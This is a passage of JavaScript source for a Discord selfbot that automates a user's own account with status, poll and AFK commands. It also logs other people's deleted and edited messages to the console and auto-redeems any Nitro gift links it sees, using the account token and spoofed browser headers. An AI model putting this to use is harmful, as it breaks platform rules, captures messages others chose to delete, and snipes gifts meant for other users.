                            .addField(`*iplookup*    ${preMARK}`, "`Look ip infos.`")
                            .setImage(image)
                            .setFooter("ksX Self", client.user.avatarURL)
                        message.edit(toolsembed)
                    }
                }

                if (message.content === prefix + "status") {
                    if (message.author.id === client.user.id) {
                        let satusembed = new Discord.RichEmbed()
                            .setTitle("**Status Page**")
                            .setColor(color)
                            .setDescription("Prefix : ```" + prefix + "```")
                            .addField(`*online*`, "`Set your status to online.`")
                            .addField(`*dnd*`, "`Set your status to do not disturb.`")
                            .addField(`*invisible*`, "`Set your status to invisble.`")
                            .addField(`*idle*`, "`Set your status to idle.`")
                            .addField(`*play*`, "`Set your activity to playing.`")
                            .addField(`*watch*`, "`Set your activity to watching.`")
                            .addField(`*listen*`, "`Set your activity to listening.`")
                            .addField(`*stream*`, "`Set your activity to streaming.`")
                            .addField(`*defaultrpc*`, "`Set the default rpc off ksX`")
                            .addField(`*multistream*    ${preMARK}`, "`Put a lot of status.`")
                            .addField(`*multistatus*    ${preMARK}`, "`Display a lot of status.`")
                            .addField(`*stopactivity*`, "`Removed your activity/satus.`")
                            .setImage(image)
                            .setFooter("ksX Self", client.user.avatarURL)
                        message.edit(satusembed)
                    }
                }
                if (message.content.startsWith(prefix + 'poll')) {
                    if (message.author.id === client.user.id) {
                        if (!args) return message.channel.send("Please provide a text");
                        var pollembed = new Discord.RichEmbed()
                            .setTitle('**Poll**')
                            .setColor(color)
                            .setDescription("**" + args + "**")
                            .addField('✅ = For   ⬜ = Neutral   ❌ = Against', '** **')
                            .setImage(image)
                            .setFooter("ksX Self", client.user.avatarURL)
                        message.channel.sendMessage(pollembed).then(function (msg) {
                            msg.react('✅');
                            msg.react('⬜');
                            msg.react('❌');
                        });
                    }
                }

                var afk = JSON.parse(fs.readFileSync("./afk.json", "utf8"));

                var messageArray = message.content.split(" ");
                var args = messageArray.slice(1);
                var reason = args.join(" ")

                if (message.content.startsWith(prefix + 'afkon')) {
                    if (message.author.id === client.user.id) {

                        if (afk[message.author.id]) {
                            var alreadyafk = new Discord.RichEmbed()
                                .setTitle('**AFK**')
                                .setColor(color)
                                .setDescription("Your already **AFK**!")
                                .setFooter("ksX Self", client.user.avatarURL)
                            message.edit(alreadyafk).then(message => message.delete(5500))
                        } else {
                            if (reason.length === 0) {
                                afk[message.author.id] = {
                                    reason: true
                                };
                                var reasonnull = new Discord.RichEmbed()
                                    .setTitle('**AFK**')
                                    .setColor(color)
                                    .setDescription("You don't provided a reason for you **AFK**!")
                                    .setFooter("ksX Self", client.user.avatarURL)
                                message.edit(reasonnull).then(message => message.delete(5500))
                            } else {
                                afk[message.author.id] = {
                                    reason: reason
                                };
                                var afkembed = new Discord.RichEmbed()
                                    .setTitle('**AFK**')
                                    .setColor(color)
                                    .setDescription("Your now **AFK** for: " + reason + "!")
                                    .setFooter("ksX Self", client.user.avatarURL)
                                message.edit(afkembed).then(message => message.delete(5500))
                            }
                            fs.writeFile("./afk.json", JSON.stringify(afk), error => {
                                if (error) console.error(error)
                            });
                        }
                    }
                }

                if (message.content.startsWith(prefix + "afkoff")) {
                    if (message.author.id === client.user.id) {

                        if (afk[message.author.id]) {
                            delete afk[message.author.id];

                            var unafk = new Discord.RichEmbed()
                                .setTitle('**AFK**')
                                .setColor(color)
                                .setDescription("Your **AFK** has been removed!")
                                .setFooter("ksX Self", client.user.avatarURL)
                            message.edit(unafk).then(message => message.delete(5500))

                        } else {
                            message.edit(unafk).then(message => message.delete(5500))
                        }
                        fs.writeFile("./afk.json", JSON.stringify(afk), error => {
                            if (error) console.error(error)
                        });
                    } else {
                        message.edit(unafk).then(message => message.delete(5500))
                    }
                }

                if (message.mentions.users.size > 0) {
                    if (message.author.id !== client.user.id) {
                        if (afk[message.mentions.users.first().id]) {

                            var noafkmsg = "I don't provided a reason for my **AFK**!"
                            var afkmsg = "I'm **AFK** for: " + afk[message.mentions.users.first().id].reason

                            if (afk[message.mentions.users.first().id].reason === true) {

                                message.channel.send(noafkmsg);
                            } else {
                                message.channel.send(afkmsg);
                            }
                        }
                    }
                }


                if (message.content.includes('@everyone') || message.content.includes('@here')) {
                    if (message.author.id === client.user.id) return;
                    let serveur = message.guild;
                    if (!serveur) return console.log(`You got pinged in your dms by: \n`.yellow) ^ console.log(`${message.author.tag}: ${message.content} (${message.guild})`.green)
                    console.log('[ksX SelfBot Logs] → '.red)
                    console.log(`You got pinged in: \n`.yellow) ^ console.log(`${message.author.tag}: ${message.content} (${message.guild})`.green)
                } else return
            } catch (error) {
                if (error) {
                    console.log('An error occurred!\n' + error)
                }
            }
        })


        client.on("messageDelete", message => {
            if (message.author.id === client.user.id) return;
            if (message.channel.type === "dm") {
                if (abusedlogs.includes("off")) {
                    console.log('[ksX SelfBot Logs] → '.yellow) ^
                        console.log('________________________'.blue)
                    console.log(`${message.author.tag} deleted: ${message.content} in your dms`.green)
                }
            }
        })
        client.on("messageUpdate", message => {
            if (message.author.id === client.user.id) return;
            if (abusedlogs.includes("off")) {
                if (message.channel.type === "dm") {
                    console.log('________________________'.blue)
                    console.log('[ksX SelfBot Logs] → '.yellow)
                    console.log(`${message.author.tag} edited: ${message.content} in your dms`.green)
                }
            }
        })

        client.on("messageDelete", message => {
            if (message.author.id === client.user.id) return;
            if (abusedlogs.includes("on")) {
                console.log('[ksX SelfBot Logs] → '.yellow) ^
                    console.log('________________________'.blue)
                console.log(`${message.author.tag} deleted: ${message.content} in ${message.guild}`.green)
            }
        })

        client.on("messageUpdate", message => {
            if (message.author.id === client.user.id) return;
            if (abusedlogs.includes("on")) {
                console.log('________________________'.blue)
                console.log('[ksX SelfBot Logs] → '.yellow)
                console.log(`${message.author.tag} edited: ${message.content} in ${message.guild}`.green)
            }
        })

        client.on("roleCreate", role => {
            console.log('________________________'.blue)
            console.log('[ksX SelfBot Logs] → '.yellow)
            console.log(`Role: ${role.name}\nCreated in: ${role.guild.name}`.green)
        })

        client.on("roleDelete", role => {
            console.log('________________________'.blue)
            console.log('[ksX SelfBot Logs] → '.yellow)
            console.log(`Role: ${role.name}\nDeleted in: ${role.guild.name}`.green)
        })

        client.on('guildDelete', guild => {
            console.log('________________________'.blue)
            console.log('[ksX SelfBot Logs] → '.yellow)
            console.log(`You just leaved ${guild.name}`.green)
        })

        client.on('guildCreate', guild => {
            console.log('________________________'.blue)
            console.log('[ksX SelfBot Logs] → '.yellow)
            console.log(`You just joined ${guild.name}`.green)
        })
        client.on('channelCreate', channel => {
            try {
                console.log('________________________'.blue)
                console.log('[ksX SelfBot Logs] → '.yellow)
                console.log(`Channel: ${channel.name}\nCreated in: ${channel.guild.name}`.green)
            } catch (error) {
                if (error) {
                    console.log('An error occurred!')
                }
            }
        })

        client.on('channelDelete', channel => {
            try {
                console.log('________________________'.blue)
                console.log('[ksX SelfBot Logs] → '.yellow)
                console.log(`Channel: ${channel.name}\nDeleted in: ${channel.guild.name}`.green)
            } catch (error) {
                if (error) {
                    console.log('An error occurred!')
                }
            }
        })

        function linknitro(length, letter) {

            var multiplier = '';
            if (letter.indexOf('0') > -1) multiplier += '0123456789';
            if (letter.indexOf('A') > -1) multiplier += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
            if (letter.indexOf('a') > -1) multiplier += 'abcdefghijklmnopqrstuvwxyz';
            var results = '';


            for (var i = length; i > 0; --i) {
                results += multiplier[Math.floor(Math.random() * multiplier.length)];

            }

            return results;

        }

        function stringGen(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * charactersLength));
            }
            return result;
        }

        function matchCode(text, callback) {
            let codes = text.match(/https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/)
            if (codes) {
                callback(codes[0])
                return matchCode(text.slice(codes.index + codes[0].length), callback)
            } else {
                callback(null)
            }
        }

        client.on("message", message => {
            if (claimer.includes("on")) {
                let codes = [];
                matchCode(message.content, (code) => {
                    if (!code) {
                        return
                    }
                    if (!codes.includes(code)) {
                        codes.push(code)
                    }
                });
                if (codes.length == 0) {
                    return
                }
                codes.forEach((code) => {
                    fetch('https://canary.discordapp.com/api/v6/entitlements/gift-codes/' + code.split("/").pop() + "/redeem", {
                        method: "post",
                        headers: {
                            "Accept": '*/*',
                            "Accept-Encoding": "gzip, deflate, br",
                            "Accept-Language": "en-US",
                            "Authorization": client.token,
                            "Connection": 'keep-alive',
                            "Content-Length": JSON.stringify({
                                channel_id: message.channel.id
                            }).length,
                            "Content-Type": 'application/json',
                            "Host": 'canary.discordapp.com',
                            "Referer": `https://canary.discordapp.com/channels/${message.channel.id}/${message.id}`,
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                            "X-super-properties": Buffer.from(JSON.stringify({
                                "os": "Windows",
                                "browser": "Firefox",
                                "device": "",
                                "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                                "browser_version": "66.0",
                                "os_version": "10",
                                "referrer": "",
                                "referring_domain": "",
                                "referrer_current": "",
                                "referring_domain_current": "",
                                "release_channel": "canary",
                                "client_build_number": 37519,
                                "client_event_source": null
                            }), "utf-8").toString("base64")
                        },
                        body: JSON.stringify({
                            channel_id: message.channel.id
                        })
                    }).then(res => {
                        if (res.status == 400 || res.status == 404) {
                            return console.log('________________________'.blue) ^ console.log('[ksX SelfBot Logs] → '.yellow) ^ console.log(`Invalid Code ${code}`.red)
                        }
                        res.json().then(json => {
                            console.log(json);
                            console.log('________________________'.blue)
                            console.log('[ksX SelfBot Logs] → '.yellow)
                            console.log(`A nitro was claimed (not sure) : ${code}`.green)
                        })
                    }).catch(console.error)
                })
            }
        });
    }).catch(error => console.log(error));
        client.login(token).catch((error) => {
            if (error.toString().includes("Incorrect login details were provided".red) || error.toString().includes("An invalid token was provided".red)) {
                console.log("Please edit your token in config.json".red)
            }
        })
    }
})
